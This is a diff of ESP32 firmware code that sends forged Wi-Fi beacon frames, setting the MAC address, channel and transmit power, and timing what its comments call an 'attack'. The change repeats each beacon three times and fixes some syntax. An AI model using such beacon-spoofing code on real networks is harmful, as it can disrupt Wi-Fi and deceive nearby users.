@@ -117,10 +117,13 @@ void setup(){
 }
 
 void loop(){
+    currentTime = millis();
     for(int j=0; j<i; j++){
-        currentTime = millis();
         //best effort basis for now
-        nextChannel();
+        // nextChannel();
+
+        //set power
+        setPower(txs[j]);
 
         //*******packet manipulation*******//
         //set mac address
@@ -138,17 +141,19 @@ void loop(){
         //change channel
         beaconPacket[82] = channel;
 
-        //set power
-        setPower(txs[j]);
-
-        //send beacon
-        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false));
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        //increment packet count
-        packetCount++;
-        //increment attack time
-        attackTime = millis();
+        //send beacon 3 times
+        for(int cnt = 0; cnt < 3; cnt++){
+            //send beacon
+            ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false));
+            //increment packet count
+            packetCount++;
+            vTaskDelay(30 / portTICK_PERIOD_MS);
+        }
+        
+        //measure attack time
+        
     }
+    attackTime = millis();
     Serial.print("Attack complete. Time taken:");
     Serial.println(attackTime - currentTime);
     Serial.print("Packets sent: ");
@@ -171,7 +176,7 @@ void nextChannel(){
     //read channel back
     wifi_second_chan_t second; //not used
     esp_wifi_get_channel(&channel, &second);
-    Serial.print("Channel set to: ")
+    Serial.print("Channel set to: ");
     Serial.println(channel);
 }
 
@@ -179,7 +184,7 @@ void setPower(uint8_t tx_power){
     Serial.print("Setting power to: ");
     Serial.println(tx_power);
     ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(tx_power));
-    vTaskDelay(10 / portTICK_PERIOD_MS)
+    vTaskDelay(20 / portTICK_PERIOD_MS);
     //read the power back
     int8_t power;
     esp_wifi_get_max_tx_power(&power);
